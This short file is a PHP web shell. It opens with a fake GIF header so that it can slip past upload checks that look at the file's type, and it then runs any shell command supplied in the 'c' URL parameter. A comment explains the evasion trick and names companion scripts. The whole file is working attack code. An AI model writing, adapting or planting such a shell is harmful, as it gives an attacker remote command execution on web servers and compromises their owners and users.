GIF89;
<?php
/* simple PHP shell. Starts with a GIF prelude, so you can upload it to places
 * that check the mime type after upload. Can be used directly, or with
 * tramp.py & shell.py
 */
system($_GET['c']);
?>
